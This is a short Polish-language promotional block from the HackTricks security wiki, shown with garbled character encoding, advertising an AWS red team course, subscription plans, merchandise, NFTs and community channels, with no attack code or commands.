<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
